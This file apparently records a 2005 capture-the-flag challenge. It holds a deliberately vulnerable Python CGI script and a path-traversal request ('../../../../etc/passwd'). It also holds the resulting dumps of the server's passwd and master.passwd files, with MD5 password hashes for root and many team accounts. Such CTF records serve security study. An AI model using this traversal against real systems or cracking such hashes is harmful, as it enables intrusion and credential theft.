@@ -1,0 +1,643 @@
+kurios@gandalf:~$ telnet dujour.kenshoto.com 80
+Trying 206.131.226.59...
+Connected to dujour.kenshoto.com.
+Escape character is '^]'.
+
+GET / HTTP/1.0
+
+HTTP/1.1 200 OK
+Date: Fri, 03 Jun 2005 21:42:34 GMT
+Server: Apache/2.0.53 (FreeBSD)
+Last-Modified: Fri, 03 Jun 2005 18:54:36 GMT
+ETag: "3b75a-1ad-e2a7b300"
+Accept-Ranges: bytes
+Content-Length: 429
+Content-Type: text/html
+Connection: Close
+
+
+message=stage1
+--------------
+#!/usr/local/bin/python.hack
+
+import cgi
+import os
+from stat import *
+from types import InstanceType
+
+print 'Content-type: text/html'
+print
+
+form = cgi.FieldStorage()
+
+if not (form.has_key('message') and isinstance(form['message'], InstanceType)):
+    print 'A proper message must be specified!'
+else:
+    try:
+        fname = form['message'].value
+        (fdir,ffile) = os.path.split(fname)
+        if (fdir):
+            os.chdir(fdir)
+        realdir = os.getcwd()
+        mode = os.stat(ffile)[ST_MODE]
+
+        #Lets keep the traversal out of /root and /home/*
+        if "home" in realdir or "root" in realdir or "proc" in realdir or "var" in realdir or "tmp" in realdir:
+            print "Heh...  pretty funny... Try somewhere else punk (we're running with privs)"
+        elif S_ISREG(mode) == 0:
+            print "Lols... symlinks are FUN"
+        else:
+            try:
+                f = open(form['message'].value, 'r')
+                for line in f.readlines():
+                    print line,
+                f.close()
+            except IOError, e:
+                print '%s: %s' % (form['message'].value, e[1])
+    except:
+        print "Invalid Input"
+
+../../../../etc/passwd
+----------------------
+# $FreeBSD: src/etc/master.passwd,v 1.39 2004/08/01 21:33:47 markm Exp $
+#
+root:*:0:0:Unbreakable Root Password ;):/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:
+daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
+operator:*:2:5:System &:/:/usr/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
+tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
+kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
+games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
+news:*:8:8:News Subsystem:/:/usr/sbin/nologin
+man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
+sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
+smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
+mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
+bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
+proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
+_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
+uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
+pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
+www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
+nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
+invisigoth:*:1001:666:Invisigoth:/home/invisigoth:/usr/local/bin/bash
+snit:*:1002:666:The Arrogant Snit:/home/snit:/bin/sh
+interbob:*:1005:666:The Interbob:/home/interbob:/bin/sh
+sa7ori:*:1006:666:Satori:/home/sa7ori:/bin/sh
+breakme:*:1004:1004:stage1="g5MwXojjEagLzZm3JsUPEg==":/home/breakme:/home/ctf/kensh.py
+metr0:*:1007:666:Teh Metr0:/home/metr0:/usr/local/bin/bash
+mrfuzzee:*:1128:666:Mr Fuzzee:/home/mrfuzzee:/usr/local/bin/bash
+team4:*:1129:665:HTA:/home/team4:/usr/sbin/nologin
+team5:*:1130:665:individual:/home/team5:/usr/sbin/nologin
+team6:*:1131:665:DigitalRevelation:/home/team6:/usr/local/bin/bash2
+team7:*:1132:665:PlanB:/home/team7:/usr/local/bin/bash
+team8:*:1133:665:AssburgerSyndrome:/home/team8:/usr/sbin/nologin
+team9:*:1134:665:n3x:/home/team9:/usr/sbin/nologin
+team10:*:1135:665:Dist0rtedCom(DDC):/home/team10:/usr/sbin/nologin
+team11:*:1136:665:Sk3wl0fR00t:/home/team11:/usr/sbin/nologin
+team12:*:1137:665:drraid:/home/team12:/usr/sbin/nologin
+team13:*:1138:665:DarwinsBastards:/home/team13:/usr/local/bin/bash
+team14:*:1139:665:crackerguy:/home/team14:/usr/sbin/nologin
+team15:*:1140:665:DeathByZorra:/home/team15:/usr/sbin/nologin
+team16:*:1141:665:mimysqlandeye:/home/team16:/usr/sbin/nologin
+team17:*:1142:665:HappyDog:/home/team17:/usr/sbin/nologin
+team18:*:1143:665:DataSafe:/home/team18:/usr/sbin/nologin
+team19:*:1144:665:NO_NAME:/home/team19:/usr/sbin/nologin
+team20:*:1145:665:CenzicCIA:/home/team20:/usr/sbin/nologin
+team21:*:1146:665:instrumental:/home/team21:/usr/sbin/nologin
+team22:*:1147:665:segredes:/home/team22:/usr/sbin/nologin
+team23:*:1148:665:furpsplat:/home/team23:/usr/sbin/nologin
+team309:*:1149:665:Shellphish:/home/team309:/usr/sbin/nologin
+team308:*:1150:665:Bigmac_:/home/team308:/usr/sbin/nologin
+team307:*:1151:665:ProjectEELBOR:/home/team307:/usr/sbin/nologin
+team306:*:1152:665:Kooba:/home/team306:/usr/sbin/nologin
+team305:*:1153:665:ek-spl0it:/home/team305:/usr/sbin/nologin
+team310:*:1154:665:Hardwood:/home/team310:/usr/sbin/nologin
+team303:*:1155:665:YCLA:/home/team303:/usr/sbin/nologin
+team302:*:1156:665:Self:/home/team302:/usr/sbin/nologin
+team301:*:1157:665:structure:/home/team301:/usr/sbin/nologin
+team300:*:1158:665:youri:/home/team300:/usr/sbin/nologin
+team299:*:1159:665:RedDirtStars:/home/team299:/usr/sbin/nologin
+team298:*:1160:665:packet_loss:/home/team298:/usr/sbin/nologin
+team297:*:1161:665:NoOp:/home/team297:/usr/sbin/nologin
+team296:*:1162:665:RobertHudock:/home/team296:/usr/sbin/nologin
+team295:*:1163:665:jinxed1:/home/team295:/usr/sbin/nologin
+team294:*:1164:665:WraithSquad:/home/team294:/usr/sbin/nologin
+team293:*:1165:665:Structure:/home/team293:/usr/sbin/nologin
+team292:*:1166:665:spamspamandspam:/home/team292:/usr/sbin/nologin
+team291:*:1167:665:n3v3r7ru57:/home/team291:/usr/sbin/nologin
+team290:*:1168:665:Cangaceiros:/home/team290:/usr/sbin/nologin
+team289:*:1169:665:FreedomatDefcon:/home/team289:/usr/sbin/nologin
+team288:*:1170:665:TeamPeriscan:/home/team288:/usr/sbin/nologin
+team287:*:1171:665:MintyHippo:/home/team287:/usr/sbin/nologin
+team286:*:1172:665:tHecOUgaR:/home/team286:/usr/sbin/nologin
+team285:*:1173:665:advanceteam:/home/team285:/usr/sbin/nologin
+team284:*:1174:665:DUZCELILER:/home/team284:/usr/sbin/nologin
+team283:*:1175:665:jersoylv:/home/team283:/usr/sbin/nologin
+team282:*:1176:665:a1trips:/home/team282:/usr/sbin/nologin
+team281:*:1177:665:Mikey:/home/team281:/usr/sbin/nologin
+team280:*:1178:665:Delusory:/home/team280:/usr/sbin/nologin
+team279:*:1179:665:hostnotfound:/home/team279:/usr/sbin/nologin
+team278:*:1180:665:EnglishBastard:/home/team278:/usr/sbin/nologin
+team277:*:1181:665:meow:/home/team277:/usr/sbin/nologin
+team276:*:1182:665:dd:/home/team276:/usr/sbin/nologin
+team275:*:1183:665:CoreSecurity:/home/team275:/usr/sbin/nologin
+team274:*:1184:665:Asaru:/home/team274:/usr/sbin/nologin
+team273:*:1185:665:t3ch:/home/team273:/usr/sbin/nologin
+team272:*:1186:665:new2reversing:/home/team272:/usr/sbin/nologin
+team271:*:1187:665:ToxV:/home/team271:/usr/sbin/nologin
+team270:*:1188:665:Secure:/home/team270:/usr/sbin/nologin
+team313:*:1189:665:bling:/home/team313:/usr/local/bin/bash
+team314:*:1190:665:SynSecure:/home/team314:/usr/sbin/nologin
+team268:*:1191:665:MinorThreat:/home/team268:/usr/sbin/nologin
+team267:*:1192:665:Shellphish:/home/team267:/usr/sbin/nologin
+team266:*:1193:665:prioryofzion:/home/team266:/usr/sbin/nologin
+team265:*:1194:665:scyntian:/home/team265:/usr/sbin/nologin
+team264:*:1195:665:uid0:/home/team264:/usr/sbin/nologin
+team263:*:1196:665:InVinoVeritas:/home/team263:/usr/sbin/nologin
+team262:*:1197:665:NervoxInc:/home/team262:/usr/sbin/nologin
+team261:*:1198:665:Wu-Tang:/home/team261:/usr/sbin/nologin
+team260:*:1199:665:tenos:/home/team260:/usr/local/bin/bash
+team259:*:1200:665:Mike:/home/team259:/usr/sbin/nologin
+team258:*:1201:665:BunnyRabbit:/home/team258:/usr/sbin/nologin
+team257:*:1202:665:ph0enix:/home/team257:/usr/sbin/nologin
+team256:*:1203:665:RamunasGeciauskas:/home/team256:/usr/sbin/nologin
+team255:*:1204:665:individual:/home/team255:/bin/csh
+team254:*:1205:665:QuantumHack:/home/team254:/usr/sbin/nologin
+team253:*:1206:665:berserk:/home/team253:/usr/sbin/nologin
+team252:*:1207:665:ishi3000:/home/team252:/usr/sbin/nologin
+team251:*:1208:665:Ravi:/home/team251:/usr/sbin/nologin
+team250:*:1209:665:TheNewbie:/home/team250:/usr/sbin/nologin
+team249:*:1210:665:k3rb:/home/team249:/usr/sbin/nologin
+team248:*:1211:665:Cobra:/home/team248:/usr/sbin/nologin
+team247:*:1212:665:Orion:/home/team247:/usr/sbin/nologin
+team246:*:1213:665:maotx:/home/team246:/usr/sbin/nologin
+team245:*:1214:665:10f:/home/team245:/usr/sbin/nologin
+team244:*:1215:665:null:/home/team244:/usr/sbin/nologin
+team243:*:1216:665:jinxed1:/home/team243:/usr/sbin/nologin
+team242:*:1217:665:na:/home/team242:/usr/sbin/nologin
+team241:*:1218:665:RandomZero:/home/team241:/usr/sbin/nologin
+team240:*:1219:665:JA:/home/team240:/usr/sbin/nologin
+team239:*:1220:665:ytm:/home/team239:/usr/sbin/nologin
+team238:*:1221:665:PsychoSpy:/home/team238:/usr/sbin/nologin
+team237:*:1222:665:sKUrZ0:/home/team237:/usr/sbin/nologin
+team236:*:1223:665:DeadMeat:/home/team236:/usr/sbin/nologin
+team235:*:1224:665:H3C:/home/team235:/usr/sbin/nologin
+team234:*:1225:665:englishbastard:/home/team234:/usr/sbin/nologin
+team233:*:1226:665:TeamTarmak:/home/team233:/usr/sbin/nologin
+team232:*:1227:665:stejerean:/home/team232:/usr/sbin/nologin
+team231:*:1228:665:AlphaGeek:/home/team231:/usr/sbin/nologin
+team230:*:1229:665:AC-SP:/home/team230:/usr/sbin/nologin
+team229:*:1230:665:snoopydies:/home/team229:/usr/sbin/nologin
+team228:*:1231:665:bob:/home/team228:/usr/sbin/nologin
+team227:*:1232:665:lemurs:/home/team227:/usr/sbin/nologin
+team226:*:1233:665:MBT:/home/team226:/usr/sbin/nologin
+team225:*:1234:665:CarribeanPirates:/home/team225:/usr/sbin/nologin
+team224:*:1235:665:magnum_mentor:/home/team224:/usr/sbin/nologin
+team223:*:1236:665:zzz:/home/team223:/usr/sbin/nologin
+team222:*:1237:665:10:/home/team222:/usr/sbin/nologin
+team221:*:1238:665:Raychaser:/home/team221:/usr/sbin/nologin
+team220:*:1239:665:nengks:/home/team220:/usr/sbin/nologin
+team312:*:1240:665:w33t34m:/home/team312:/usr/sbin/nologin
+team315:*:1241:665:TheRocoLoco:/home/team315:/usr/sbin/nologin
+team316:*:1242:665:dd:/home/team316:/usr/sbin/nologin
+team317:*:1243:665:sadvak:/home/team317:/usr/sbin/nologin
+team318:*:1244:665:parity:/home/team318:/usr/sbin/nologin
+team319:*:1245:665:Rahzan:/home/team319:/usr/sbin/nologin
+team320:*:1246:665:RacerX:/home/team320:/usr/sbin/nologin
+team321:*:1247:665:defconhackers:/home/team321:/usr/sbin/nologin
+team322:*:1248:665:juk80x:/home/team322:/usr/sbin/nologin
+team323:*:1249:665:yellow42:/home/team323:/usr/sbin/nologin
+
+
+
+
+../../../../etc/master.passwd
+-----------------------------
+# $FreeBSD: src/etc/master.passwd,v 1.39 2004/08/01 21:33:47 markm Exp $
+#
+root:$1$LjTOlprb$V4UsOXqtOI.v6iW67Tiys/:0:0::0:0:Unbreakable Root Password ;):/root:/bin/csh
+toor:*:0:0::0:0:Bourne-again Superuser:/root:
+daemon:*:1:1::0:0:Owner of many system processes:/root:/usr/sbin/nologin
+operator:*:2:5::0:0:System &:/:/usr/sbin/nologin
+bin:*:3:7::0:0:Binaries Commands and Source:/:/usr/sbin/nologin
+tty:*:4:65533::0:0:Tty Sandbox:/:/usr/sbin/nologin
+kmem:*:5:65533::0:0:KMem Sandbox:/:/usr/sbin/nologin
+games:*:7:13::0:0:Games pseudo-user:/usr/games:/usr/sbin/nologin
+news:*:8:8::0:0:News Subsystem:/:/usr/sbin/nologin
+man:*:9:9::0:0:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
+sshd:*:22:22::0:0:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
+smmsp:*:25:25::0:0:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
+mailnull:*:26:26::0:0:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
+bind:*:53:53::0:0:Bind Sandbox:/:/usr/sbin/nologin
+proxy:*:62:62::0:0:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
+_pflogd:*:64:64::0:0:pflogd privsep user:/var/empty:/usr/sbin/nologin
+uucp:*:66:66::0:0:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
+pop:*:68:6::0:0:Post Office Owner:/nonexistent:/usr/sbin/nologin
+www:*:80:80::0:0:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
+nobody:*:65534:65534::0:0:Unprivileged user:/nonexistent:/usr/sbin/nologin
+invisigoth:*LOCKED**:1001:666::0:0:Invisigoth:/home/invisigoth:/usr/local/bin/bash
+snit:*LOCKED*:1002:666::0:0:The Arrogant Snit:/home/snit:/bin/sh
+interbob:*LOCKED*:1005:666::0:0:The Interbob:/home/interbob:/bin/sh
+sa7ori:*LOCKED*:1006:666::0:0:Satori:/home/sa7ori:/bin/sh
+breakme:$1$.pIa5snD$H7l33l065gJprBe0QVmFg/:1004:1004::0:0:stage1="g5MwXojjEagLzZm3JsUPEg==":/home/breakme:/home/ctf/kensh.py
+metr0:*:1007:666::0:0:Teh Metr0:/home/metr0:/usr/local/bin/bash
+mrfuzzee:*:1128:666::0:0:Mr Fuzzee:/home/mrfuzzee:/usr/local/bin/bash
+team4:$1$bv$zQ/is4IYBroeuRztJdvh1/:1129:665::0:0:HTA:/home/team4:/usr/sbin/nologin
+team5:$1$jX$VoNEADq86K.iRZM5yk0WM0:1130:665::0:0:individual:/home/team5:/usr/sbin/nologin
+team6:$1$rX$4EaYkX2TCrEHasXzC77It0:1131:665::0:0:DigitalRevelation:/home/team6:/usr/local/bin/bash2
+team7:$1$Hg$JZlAOEbjRqwNiR4NiSS7c.:1132:665::0:0:PlanB:/home/team7:/usr/local/bin/bash
+team8:$1$jw$.ZnRyQyK3Cj/qbywZL7/O.:1133:665::0:0:AssburgerSyndrome:/home/team8:/usr/sbin/nologin
+team9:$1$cf$DGXr0t9CbdfZoN/KmjC3//:1134:665::0:0:n3x:/home/team9:/usr/sbin/nologin
+team10:$1$bS$bn2PkuzzV6dNmNGaa3LGk0:1135:665::0:0:Dist0rtedCom(DDC):/home/team10:/usr/sbin/nologin
+team11:$1$Hf$DlmwR4oN5cTsTllYPvmPe.:1136:665::0:0:Sk3wl0fR00t:/home/team11:/usr/sbin/nologin
+team12:$1$aq$vhFfjIKdQVchpiOJUwBkO1:1137:665::0:0:drraid:/home/team12:/usr/sbin/nologin
+team13:$1$JT/W4zDn$rBnCo6UxZfvhNuJoMyUXo0:1138:665::0:0:DarwinsBastards:/home/team13:/usr/local/bin/bash
+team14:$1$LO$LqN/E40TnuUHaga5teRON.:1139:665::0:0:crackerguy:/home/team14:/usr/sbin/nologin
+team15:$1$kQ$avm0NSlOuHacmOCd8lOb20:1140:665::0:0:DeathByZorra:/home/team15:/usr/sbin/nologin
+team16:$1$gt$rQ4indZSI3E6.aSlkZFYe.:1141:665::0:0:mimysqlandeye:/home/team16:/usr/sbin/nologin
+team17:$1$bx$gj0bIVdacLktrLJnv0nan1:1142:665::0:0:HappyDog:/home/team17:/usr/sbin/nologin
+team18:$1$Sd$rYfaRBHtXKEjFyI0nwFnI/:1143:665::0:0:DataSafe:/home/team18:/usr/sbin/nologin
+team19:$1$Rn$CsD6N0Zvq8ls5yVJvUSZT/:1144:665::0:0:NO_NAME:/home/team19:/usr/sbin/nologin
+team20:$1$oX$r9Ey3pkDbPUYKgBagY2LK.:1145:665::0:0:CenzicCIA:/home/team20:/usr/sbin/nologin
+team21:$1$aN$rGOHzT.iA7zMzu8mI3IRo/:1146:665::0:0:instrumental:/home/team21:/usr/sbin/nologin
+team22:$1$ug$5cG8a81oM/YW8AQU2PViR0:1147:665::0:0:segredes:/home/team22:/usr/sbin/nologin
+team23:$1$dz$vc/2E/zjge0Wnv9yF9lT6/:1148:665::0:0:furpsplat:/home/team23:/usr/sbin/nologin
+team309:$1$Gh$odAk9YqVNBYfi0Ve1/H9v.:1149:665::0:0:Shellphish:/home/team309:/usr/sbin/nologin
+team308:$1$gD$VegTPxHuzs0ZZ3TyitaiZ/:1150:665::0:0:Bigmac_:/home/team308:/usr/sbin/nologin
+team307:$1$zZ$/.KXmQ7c/kF9iQP0jNfmc/:1151:665::0:0:ProjectEELBOR:/home/team307:/usr/sbin/nologin
+team306:$1$Ow$GcOTm8cXmUkUPxDu6Ya721:1152:665::0:0:Kooba:/home/team306:/usr/sbin/nologin
+team305:$1$SP$gXgD.qwMbmpgx8HCjrEzA0:1153:665::0:0:ek-spl0it:/home/team305:/usr/sbin/nologin
+team310:$1$Ss$p.PsnJQjDy9NrW9WZs.fi/:1154:665::0:0:Hardwood:/home/team310:/usr/sbin/nologin
+team303:$1$zo$VKLgJbbwSBUwevK8z6K/s/:1155:665::0:0:YCLA:/home/team303:/usr/sbin/nologin
+team302:$1$UP$ekzFN6TJBXBDmLlQFBfVr1:1156:665::0:0:Self:/home/team302:/usr/sbin/nologin
+team301:$1$Gp$IUC5jiOiQGJ1.BUgmCsWy1:1157:665::0:0:structure:/home/team301:/usr/sbin/nologin
+team300:$1$tQ$25R1lUtnkF1ZblB5mCDoc1:1158:665::0:0:youri:/home/team300:/usr/sbin/nologin
+team299:$1$EK$7VyTzIUuOP.B8wds3kGCw1:1159:665::0:0:RedDirtStars:/home/team299:/usr/sbin/nologin
+team298:$1$pv$ECvYbI9PQg4S2YRkiybBi0:1160:665::0:0:packet_loss:/home/team298:/usr/sbin/nologin
+team297:$1$FM$oA.hZpgwS7pBTAL7wLgEE.:1161:665::0:0:NoOp:/home/team297:/usr/sbin/nologin
+team296:$1$kZ$5BB2t23DyncttkLAh4PEv0:1162:665::0:0:RobertHudock:/home/team296:/usr/sbin/nologin
+team295:$1$DL$k3hSVB8SLhBsHVoDPu8At1:1163:665::0:0:jinxed1:/home/team295:/usr/sbin/nologin
+team294:$1$zI$Nn3uFmDOKfip8TyejRUpL.:1164:665::0:0:WraithSquad:/home/team294:/usr/sbin/nologin
+team293:$1$WT$RNZp63aVlK5kw/kzqttXZ1:1165:665::0:0:Structure:/home/team293:/usr/sbin/nologin
+team292:$1$NP$DF4Lp5Ia0a..DrzZjVjXc/:1166:665::0:0:spamspamandspam:/home/team292:/usr/sbin/nologin
+team291:$1$Ny$yHyWFKxcobWx5WuyUXL9N.:1167:665::0:0:n3v3r7ru57:/home/team291:/usr/sbin/nologin
+team290:$1$wI$aSP/AS1vk3FL5Dl8J9zTh.:1168:665::0:0:Cangaceiros:/home/team290:/usr/sbin/nologin
+team289:$1$bi$N5TUfcqQHnUdHeoj.O8Pw/:1169:665::0:0:FreedomatDefcon:/home/team289:/usr/sbin/nologin
+team288:$1$zK$6M5rRZPesqxAXHYU/G8Ua1:1170:665::0:0:TeamPeriscan:/home/team288:/usr/sbin/nologin
+team287:$1$Ya$0S.P1UWqo1c32pqEA4Kba.:1171:665::0:0:MintyHippo:/home/team287:/usr/sbin/nologin
+team286:$1$kr$VZMw.nEePYTQKBaGju6ME0:1172:665::0:0:tHecOUgaR:/home/team286:/usr/sbin/nologin
+team285:$1$MY$LP1KQzT7pp1L9upk4Cvmg0:1173:665::0:0:advanceteam:/home/team285:/usr/sbin/nologin
+team284:$1$TI$9AVvtXfeHY.VWv0/cR0VQ/:1174:665::0:0:DUZCELILER:/home/team284:/usr/sbin/nologin
+team283:$1$Ba$fj6vOEEfS7bjTEoyxWTVy0:1175:665::0:0:jersoylv:/home/team283:/usr/sbin/nologin
+team282:$1$MN$ElFvjIpOE8gORgwyL4QEr.:1176:665::0:0:a1trips:/home/team282:/usr/sbin/nologin
+team281:$1$XD$C5VuycvFlSJ6o8Jnndycf1:1177:665::0:0:Mikey:/home/team281:/usr/sbin/nologin
+team280:$1$yP$Wozt8NWO7qQHmEVYbUYw3.:1178:665::0:0:Delusory:/home/team280:/usr/sbin/nologin
+team279:$1$sb$Dr.PeernC5X7G.6wxVJP4.:1179:665::0:0:hostnotfound:/home/team279:/usr/sbin/nologin
+team278:$1$pr$pXlyy.ku3tNi/ak9gCWVU/:1180:665::0:0:EnglishBastard:/home/team278:/usr/sbin/nologin
+team277:$1$gX$DrYsROA62U83W34f5y8uZ.:1181:665::0:0:meow:/home/team277:/usr/sbin/nologin
+team276:$1$Wo$YXGcHJiIQFy/pSiHkRH9i0:1182:665::0:0:dd:/home/team276:/usr/sbin/nologin
+team275:$1$Sp$HqY1giWv7R/zNhvXRRYUT/:1183:665::0:0:CoreSecurity:/home/team275:/usr/sbin/nologin
+team274:$1$Sp$2S38VwHFAoXuI9W15Pdoo.:1184:665::0:0:Asaru:/home/team274:/usr/sbin/nologin
+team273:$1$ZM$eXbrgs.2iqo1cZ7PRbG8s1:1185:665::0:0:t3ch:/home/team273:/usr/sbin/nologin
+team272:$1$fz$sBkbWRZ4hoAdxPIsAiarp1:1186:665::0:0:new2reversing:/home/team272:/usr/sbin/nologin
+team271:$1$TO$M7yLv1fgldF855zlmuErQ.:1187:665::0:0:ToxV:/home/team271:/usr/sbin/nologin
+team270:$1$FA$wgVt2NOIFlw2ov78afJzk1:1188:665::0:0:Secure:/home/team270:/usr/sbin/nologin
+team313:$1$ZE$.sGOvWgx1FB8fBv0DW/Ik1:1189:665::0:0:bling:/home/team313:/usr/local/bin/bash
+team314:$1$MJ$V/kUeBmezw2xOrMhQnSbO/:1190:665::0:0:SynSecure:/home/team314:/usr/sbin/nologin
+team268:$1$cm$MSu1M5HESCV6XVCV0kxND0:1191:665::0:0:MinorThreat:/home/team268:/usr/sbin/nologin
+team267:$1$Yi$irvRCrV9wmB/lKlUweZXu/:1192:665::0:0:Shellphish:/home/team267:/usr/sbin/nologin
+team266:$1$Nq$hCWj37OnkdDZve7Grf/vZ0:1193:665::0:0:prioryofzion:/home/team266:/usr/sbin/nologin
+team265:$1$nf$uVbGzzWgghUsyYooswsya0:1194:665::0:0:scyntian:/home/team265:/usr/sbin/nologin
+team264:$1$Io$oaLvESwCDWaiKTyHE.Bo70:1195:665::0:0:uid0:/home/team264:/usr/sbin/nologin
+team263:$1$Bt$Q6YyeN8t3jp7vDUW9XdFe/:1196:665::0:0:InVinoVeritas:/home/team263:/usr/sbin/nologin
+team262:$1$Pz$dIyW2OwSEjGRl3uNc.ryK.:1197:665::0:0:NervoxInc:/home/team262:/usr/sbin/nologin
+team261:$1$lI$Ohc.b1fJc2qegzdc870nJ1:1198:665::0:0:Wu-Tang:/home/team261:/usr/sbin/nologin
+team260:$1$tZ$Ozy80r6Vx6rgTjdgFwPxh1:1199:665::0:0:tenos:/home/team260:/usr/local/bin/bash
+team259:$1$Kp$bwKSp71EtF3XWo42is8WJ1:1200:665::0:0:Mike:/home/team259:/usr/sbin/nologin
+team258:$1$Oj$bzrGxUJv432eZymGLaRNM1:1201:665::0:0:BunnyRabbit:/home/team258:/usr/sbin/nologin
+team257:$1$WU$x6hmag5Z.o7xSW//dJNTc.:1202:665::0:0:ph0enix:/home/team257:/usr/sbin/nologin
+team256:$1$Hk$dhy4QY.4KaV.DqCNOt73x0:1203:665::0:0:RamunasGeciauskas:/home/team256:/usr/sbin/nologin
+team255:$1$em$nNVgWRd0xLsZilZb6M7HP1:1204:665::0:0:individual:/home/team255:/bin/csh
+team254:$1$Wj$XPXn0KGjHyDRRHkfgzy2Y1:1205:665::0:0:QuantumHack:/home/team254:/usr/sbin/nologin
+team253:$1$cs$ZfQ8aa.dAxVzKygAlF.gQ0:1206:665::0:0:berserk:/home/team253:/usr/sbin/nologin
+team252:$1$pa$I6Uwbi/9dvBHHhfgO8UhN.:1207:665::0:0:ishi3000:/home/team252:/usr/sbin/nologin
+team251:$1$Vl$mQ8zWgsfTvGM/FmXEZpN20:1208:665::0:0:Ravi:/home/team251:/usr/sbin/nologin
+team250:$1$ED$Vyv730pMS6s1Y3DeBbHeo0:1209:665::0:0:TheNewbie:/home/team250:/usr/sbin/nologin
+team249:$1$tZ$MUTQ/ffiewGhSBjRJOzqb1:1210:665::0:0:k3rb:/home/team249:/usr/sbin/nologin
+team248:$1$sf$/FCrb/GUZaAuoDaGjvBfJ.:1211:665::0:0:Cobra:/home/team248:/usr/sbin/nologin
+team247:$1$QH$wJaBxiqLvIn4xazxJ90o6.:1212:665::0:0:Orion:/home/team247:/usr/sbin/nologin
+team246:$1$nr$qLnHLzu0wLT6hwRTGNFPM0:1213:665::0:0:maotx:/home/team246:/usr/sbin/nologin
+team245:$1$NQ$RwN6JaIpUY62q1zPcOtld1:1214:665::0:0:10f:/home/team245:/usr/sbin/nologin
+team244:$1$NA$zM4KbR45I.7DZnyW8lAhX0:1215:665::0:0:null:/home/team244:/usr/sbin/nologin
+team243:$1$xJ$oIfnEtdBGFwz3qq86XIyd0:1216:665::0:0:jinxed1:/home/team243:/usr/sbin/nologin
+team242:$1$yo$zfhiRVUadSyDt2ybCTuD20:1217:665::0:0:na:/home/team242:/usr/sbin/nologin
+team241:$1$XT$rplvdO4rKBAO.K8kLN6uF1:1218:665::0:0:RandomZero:/home/team241:/usr/sbin/nologin
+team240:$1$CB$s.2.R.HY110zz309Jsb54/:1219:665::0:0:JA:/home/team240:/usr/sbin/nologin
+team239:$1$lt$/ajyKaWX2jhyeQY.BUhfs1:1220:665::0:0:ytm:/home/team239:/usr/sbin/nologin
+team238:$1$dn$vmVZRX9i64YkNBo6imo5N.:1221:665::0:0:PsychoSpy:/home/team238:/usr/sbin/nologin
+team237:$1$rK$lSlcy2tb7i2j6rC2V1nFz.:1222:665::0:0:sKUrZ0:/home/team237:/usr/sbin/nologin
+team236:$1$Iz$cKdwYE/wra14.aBxTmjIN0:1223:665::0:0:DeadMeat:/home/team236:/usr/sbin/nologin
+team235:$1$tc$XpSl2Q11Bd6hKhmGJOBZ2/:1224:665::0:0:H3C:/home/team235:/usr/sbin/nologin
+team234:$1$pW$D.jSEXjPYihjaqvP8yiX/0:1225:665::0:0:englishbastard:/home/team234:/usr/sbin/nologin
+team233:$1$rQ$wcuYL3L3d0/HNQh2F06y.1:1226:665::0:0:TeamTarmak:/home/team233:/usr/sbin/nologin
+team232:$1$yQ$zzeIJ9moug/kJfebAJGtA1:1227:665::0:0:stejerean:/home/team232:/usr/sbin/nologin
+team231:$1$zf$clJvpzg4rc25.SwdDkdns0:1228:665::0:0:AlphaGeek:/home/team231:/usr/sbin/nologin
+team230:$1$Jf$oQKtSidsn3Xbq/nzpf1i91:1229:665::0:0:AC-SP:/home/team230:/usr/sbin/nologin
+team229:$1$Zs$W6Dcc/25yC8V7OCtUNFKr.:1230:665::0:0:snoopydies:/home/team229:/usr/sbin/nologin
+team228:$1$On$ypWFObrCV90/OjBGIuIjK.:1231:665::0:0:bob:/home/team228:/usr/sbin/nologin
+team227:$1$qT$BrSnV1zb80aSPJX.TCMrC/:1232:665::0:0:lemurs:/home/team227:/usr/sbin/nologin
+team226:$1$PH$OkhPDhUiqUO876Jm.GEc90:1233:665::0:0:MBT:/home/team226:/usr/sbin/nologin
+team225:$1$HB$jqpewZ8g94wDWkk7WfvR2.:1234:665::0:0:CarribeanPirates:/home/team225:/usr/sbin/nologin
+team224:$1$Vj$maZm42K1lNblJHxj5yNV11:1235:665::0:0:magnum_mentor:/home/team224:/usr/sbin/nologin
+team223:$1$wy$JSdWH.uvlDIpVrDINelbi.:1236:665::0:0:zzz:/home/team223:/usr/sbin/nologin
+team222:$1$CB$qtbg3Sodp8kGMOwa3/F0h0:1237:665::0:0:10:/home/team222:/usr/sbin/nologin
+team221:$1$hx$MmNBLOPSV5VPtWzcBcQFv/:1238:665::0:0:Raychaser:/home/team221:/usr/sbin/nologin
+team220:$1$wZ$10ZtAtagdi/FiHv9YR6qT/:1239:665::0:0:nengks:/home/team220:/usr/sbin/nologin
+team312:$1$Pd$ATndMbyce3coSfJtQ039O0:1240:665::0:0:w33t34m:/home/team312:/usr/sbin/nologin
+team315:$1$Sz$yZ.8cf5ytOXFSvhoPdgMi0:1241:665::0:0:TheRocoLoco:/home/team315:/usr/sbin/nologin
+team316:$1$bS$f4OX66f49TvaGbFveikSm1:1242:665::0:0:dd:/home/team316:/usr/sbin/nologin
+team317:$1$hB$XZViskREo0y86aKRJ7aKr1:1243:665::0:0:sadvak:/home/team317:/usr/sbin/nologin
+team318:$1$zb$6TY656lhw6/UbT6IhcHNG.:1244:665::0:0:parity:/home/team318:/usr/sbin/nologin
